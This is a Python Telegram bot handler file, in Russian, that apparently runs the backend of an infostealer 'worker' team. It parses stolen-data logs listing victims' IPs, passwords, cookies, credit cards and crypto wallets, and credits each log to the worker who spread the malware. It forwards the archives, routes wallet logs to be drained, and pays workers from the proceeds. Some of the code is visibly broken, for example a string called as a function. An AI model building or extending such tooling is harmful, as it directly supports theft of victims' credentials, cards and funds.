# # - *- coding: utf- 8 - *-
# from aiogram.dispatcher import FSMContext
# from aiogram.types import Message
#
# from tgbot.data.config import bot_version, PATH_LOGS, DATABASE_PATH
# from tgbot.keyboards.inline_z_all import chat_inl
# from tgbot.keyboards.reply_z_all import payments_frep, settings_frep, functions_frep, items_frep, admin_menu, \
#     admin_settings_btn
# from tgbot.loader import dp
# from tgbot.services.api_sqlite import get_userx, get_settingsx
# from tgbot.utils.const_functions import get_date
# from tgbot.utils.misc.bot_filters import IsAdmin, IsAdmin_pro, IsChat
# from tgbot.utils.misc_functions import get_statisctics
#
#
import os
from typing import Union

from aiogram import types
from aiogram.dispatcher import FSMContext
from aiogram.types import Message, ContentType, ReplyKeyboardRemove

from loader import dp, bot
from services.dbhandler import add_userx, get_req, remove_req, update_userx, get_settings, get_userx
from keyboards.inline_admin import kick_user_inl, reAdd_user_inl, get_balance


@dp.callback_query_handler(text_startswith="adminwithdraw_", state="*")
async def withdraw(call: types.CallbackQuery, state: FSMContext):
    action = call.data.split('_')[1].split(':')
    print(action)
    if action[0] == "accept":
        await bot.send_message(action[1], f'<b>✅ Заявка на вывод успешно выполнена!</b>\n\n'
                                          f'💸 Сумма: {action[2]}$')
        await call.message.edit_text(call.message.text + "\n\n<b>Решение: </b>✅️  <i>Одобрено</i>", reply_markup='')

    if action[0] == "cancel":
        user_data = get_userx(user_id=action[1])
        update_userx(user_id=action[1], user_balance=user_data['user_balance'] + int(action[2]))
        await bot.send_message(action[1], f'<b>❌ Заявка на вывод отклонена!\n\n</b>'
                                          f'💸 Сумма: {action[2]}$\n'
                                          f'📥 Деньги вернулись на баланс.')
        await call.message.edit_text(call.message.text + "\n\n<b>Решение: </b>❌️  <i>Отклонена</i>", reply_markup='')


    if action[0] == "wrong":
        user_data = get_userx(user_id=action[1])
        update_userx(user_id=action[1], user_balance=user_data['user_balance'] + int(action[2]))
        await bot.send_message(action[1], f'<b>⚠️ Заявка на вывод отклонена.\n\n</b>'
                                          f'<b>📋 Причина:</b> <i>неправильный ввод</i>\n\n'
                                          f'💸 Сумма: {action[2]}$\n'
                                          f'📥 Деньги вернулись на баланс.')
        await call.message.edit_text(call.message.text + "\n\n<b>Решение: </b>⚠️ <i>Отклонена (неправильный ввод)</i>", reply_markup='')




@dp.channel_post_handler(content_types=ContentType.DOCUMENT)
async def channel(message: Message):
    chat_id = get_settings()['botlogchat']
    if message.chat.id == chat_id:
        text = message.caption
        text = text.split('\n')
        numLog = text[0].split()[1]
        buildLog = text[1].split()[1]

        if get_userx(user_id=buildLog)['user_name'] is None:
            username = 'Без ника 👽'
        else:
            if get_userx(user_id=buildLog)['is_visible'] == 0:
                username = "Анонимус 👀"
            else:
                username = "@"+get_userx(user_id=buildLog)['user_name']
        osLog = " ".join(text[2].split()[1:])
        ipLog = text[3].split()[1]
        dataLog = text[4].split()[1]
        dtPass = dataLog.split('|')[0]
        dtCookie = dataLog.split('|')[1]
        dtCards = dataLog.split('|')[2]
        dtColds = dataLog.split('|')[3]
        countryLog = text[5].split()[1]
        new_log = f"""🌙 Новый лог №{numLog}

🧑🏻‍🚀 Воркер - {username}

🏳️ IP -  <code>{ipLog}</code>
🌎 Страна - {countryLog}
💻 Система - <code>{osLog}</code>
=============
💸 Паролей: <code>{dtPass} |</code>
=============
💸 Куки: <code>{dtCookie} |</code>
=============
💸 СС: <code>{dtCards}</code>
=============
🧊 Холодных: <code>{dtColds}</code>
=============
🪐 Кратко - <code>{dataLog}</code>"""
        new_log_user = f"""🌙 Новый лог №{numLog}

🏳️ IP -  <code>{ipLog}</code>
🌎 Страна - {countryLog}
💻 Система - <code>{osLog}</code>
=============
💸 Паролей: <code>{dtPass} |</code>
=============
💸 Куки: <code>{dtCookie} |</code>
=============
💸 СС: <code>{dtCards}</code>
=============
🧊 Холодных: <code>{dtColds}</code>
=============
🪐 Кратко - <code>{dataLog}</code>"""

        cap = new_log
        cap_user = new_log_user
        # if config.otrabcold:
        if int(dtColds) <= 0:
            settings = get_settings()
            await bot.send_message(settings['logchat'], cap, parse_mode=types.ParseMode.HTML)
            await bot.send_document(buildLog, message.document.file_id, caption=cap_user)
            file_info = await bot.get_file(message.document.file_id)
            src = './users/{0}/'.format(buildLog) + message.document.file_name
            user = get_userx(user_id=buildLog)
            update_userx(user_id=buildLog, daylogs=user['daylogs'] + 1, weeklogs=user['weeklogs'] + 1, monthlogs=user['monthlogs'] + 1,alllogs=user['alllogs'] + 1)
            await bot.download_file(file_info.file_path, src)
        else:
            settings = get_settings()
            await bot.send_message(buildLog, cap, parse_mode=types.ParseMode.HTML)
            find_holodok = "🟢 В вашем логе №{0} найден холодок, лог отправлен на отработку. После проверки вам придет уведомление!"
            otrCap = buildLog + " " + numLog + " " + message.document.file_id + " " + dataLog
            # await bot.send_message(settings['logchat'], cap, parse_mode=types.ParseMode.HTML)
            await bot.send_message(buildLog, find_holodok.format(numLog), parse_mode=types.ParseMode.HTML)
            user = get_userx(user_id=buildLog)
            update_userx(user_id=buildLog, daylogs=user['daylogs'] + 1, weeklogs=user['weeklogs'] + 1, monthlogs=user['monthlogs'] + 1,alllogs=user['alllogs'] + 1, daycolds=user['daycolds'] + 1, weekcolds=user['weekcolds'] + 1, monthcolds=user['monthcolds'] + 1,allcolds=user['allcolds'] + 1)
            # buttons = [
            #     types.InlineKeyboardButton(text="✅ Добавить баланс", callback_data=f"addbalance:{buildLog}"),
            #     types.InlineKeyboardButton(text="❌ Пусто", callback_data=f"empty:{buildLog}"),
            # ]
            # answer = types.InlineKeyboardMarkup()
            # answer = types.InlineKeyboardMarkup(row_width=2)
            # answer.add(*buttons)
            new_log(buildLog, numLog, message.document.file_id)
            await bot.send_document(settings['otrabchat'], message.document.file_id, caption=cap,
                                    reply_markup=await get_balance(buildLog, dataLog))
        # else:
        #     await bot.send_message(config.logchatID, cap, parse_mode=types.ParseMode.HTML)
        #     await bot.send_document(buildLog, message.document.file_id, caption=cap)
        #     file_info = await bot.get_file(message.document.file_id)
        #     src = './users/{0}/'.format(buildLog) + message.document.file_name;
        #     db.addLog(buildLog)
        #     await bot.download_file(file_info.file_path, src)



@dp.callback_query_handler(text_startswith="empty", state="*")
async def emptycold(call: types.CallbackQuery):
    await call.message.edit_caption(call.message.caption + "\n Пустой лог.")
    mestext = call.data.split(":")
    user_id = mestext[0]
    num = mestext[1]
    file = mestext[2]
    no_money = "❌ Извините, но лог №{0} с холодным кошельком пуст. Лог доступен к выгрузке."
    file_info = await bot.get_file(file)
    src = './users/{0}/'.format(user_id) + call.message.document.file_name+'.zip'
    await bot.download_file(file_info.file_path, src)
    await bot.send_message(user_id, no_money.format(num))



@dp.callback_query_handler(text_startswith="addbalance", state="*")
async def emptycold(call: types.CallbackQuery, state: FSMContext):
    user_id = call.data.split(":")[1]
    await state.set_state("add_balance")
    await call.message.answer("Введите сумму:")
    # mestext = call.message.caption.split()
    await state.update_data(here_call=call)
    await state.update_data(here_user_id=user_id)





@dp.message_handler(state='add_balance')
async def process_name(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        call = data['here_call']
        user_id = data['here_user_id']
    if message.text.isdigit():
        mestext = call.message.caption.split()
        num = mestext[1]
        file = mestext[2]
        file_info = await bot.get_file(file)
        src = './users/{0}/'.format(user_id) + call.message.document.file_name+'.zip'
        await bot.download_file(file_info.file_path, src)
        find_money = "💰 Поздравляем! В вашем логе №{0} найден баланс в {1}$. Лог доступен к выгрузке."
        await bot.send_message(user_id, find_money.format(num, message.text))
        user = get_userx(user_id=user_id)
        update_userx(user_id=user_id, user_balance=user['user_balance'] + int(message.text))
        await call.message.edit_caption(call.message.caption + f"\n Найдено {message.text} баксов.")
        await state.finish()
    else:
        await message.answer("Неправильный ввод")
        await call.message.answer("Введите сумму:")
        await state.set_state("add_balance")



# # Платежные системы
# @dp.message_handler(IsAdmin_pro(), IsChat(), text="💳 Платежные методы", state="*")
# async def admin_payment(message: Message, state: FSMContext):
#     await state.finish()
#
#     await message.answer("<b>💳 Настройка платежных системы.</b>", reply_markup=payments_frep())
#
#
# # Настройки бота
# @dp.message_handler(IsAdmin(), IsChat(), text="⚙ Настройки", state="*")
# async def admin_settings(message: Message, state: FSMContext):
#     await state.finish()
#
#     await message.answer("<b>⚙ Основные настройки бота.</b>", reply_markup=settings_frep())
#
#
# # Общие функции
# @dp.message_handler(IsAdmin(), IsChat(), text="🔆 Общие функции", state="*")
# async def admin_functions(message: Message, state: FSMContext):
#     await state.finish()
#
#     await message.answer("<b>🔆 Выберите нужную функцию.</b>", reply_markup=functions_frep(message.from_user.id))
#
#
# @dp.message_handler(IsAdmin_pro(), IsChat(), text="🍷 Управление чатами", state="*")
# async def admin_payment(message: Message, state: FSMContext):
#     await state.finish()
#
#     chat_link = get_settingsx()['misc_chat_link']
#     await message.answer("🍷 Действующий чат:\n"
#                          f"{chat_link}", reply_markup=chat_inl)
#
# @dp.message_handler(IsAdmin(), IsChat(), text="🔒Админ панель", state="*")
# async def admin_menu_(message: Message, state: FSMContext):
#     await state.finish()
#
#     await message.answer("<b>🔒Админ панель.</b>", reply_markup=admin_menu(message.from_user.id))
#
#
# @dp.message_handler(IsAdmin(), IsChat(), text="⬅ Назад", state="*")
# async def admin_menu_(message: Message, state: FSMContext):
#     await state.finish()
#
#     await message.answer("<b>🔒Админ панель.</b>", reply_markup=admin_menu(message.from_user.id))
#
# @dp.message_handler(IsAdmin(), IsChat(), text="⬅  Назад", state="*")
# async def admin_menu_(message: Message, state: FSMContext):
#     await state.finish()
#     user_role = get_userx(user_id=message.from_user.id)['user_role']
#     if user_role == 'Admin':
#         await message.answer("<b>⚙️ Настройки.</b>", reply_markup=admin_settings_btn())
#     elif user_role == 'Support':
#         await message.answer("<b>⚙️ Настройки.</b>", reply_markup=admin_menu(message.from_user.id))
#
#
#
# @dp.message_handler(IsAdmin_pro(), IsChat(), text="⚙️ Настройки", state="*")
# async def admin_settings_(message: Message, state: FSMContext):
#     await state.finish()
#
#     await message.answer("<b>⚙️ Настройки.</b>", reply_markup=admin_settings_btn())
#
#
#
# # Управление товарами
# @dp.message_handler(IsAdmin(), IsChat(), text="🛍 Управление товарами", state="*")
# async def admin_products(message: Message, state: FSMContext):
#     await state.finish()
#
#     await message.answer("<b>🛍 Редактирование товаров.</b>", reply_markup=items_frep())
#
#
# # Cтатистики бота
# @dp.message_handler(IsAdmin(), IsChat(), text="❇️ Статистика", state="*")
# async def admin_statistics(message: Message, state: FSMContext):
#     await state.finish()
#
#     await message.answer(get_statisctics())
#
#
# # Получение БД
# @dp.message_handler(IsAdmin_pro(), IsChat(), commands=['db', 'database'], state="*")
# async def admin_database(message: Message, state: FSMContext):
#     await state.finish()
#
#     with open(DATABASE_PATH, "rb") as document:
#         await message.answer_document(document,
#                                       caption=f"<b>📦 BACKUP</b>\n"
#                                               f"<code>🕰 {get_date()}</code>")
#
#
# # Получение Логов
# @dp.message_handler(IsAdmin_pro(), IsChat(), commands=['log', 'logs'], state="*")
# async def admin_log(message: Message, state: FSMContext):
#     await state.finish()
#
#     with open(PATH_LOGS, "rb") as document:
#         await message.answer_document(document,
#                                       caption=f"<b>🖨 LOGS</b>\n"
#                                               f"<code>🕰 {get_date()}</code>")
#
#
# # Получение версии бота
# @dp.message_handler(commands="version", state="*")
# async def admin_version(message: Message, state: FSMContext):
#     await state.finish()
#
#     await message.answer(f"<b>❇ Текущая версия бота: <code>{bot_version}</code></b>")
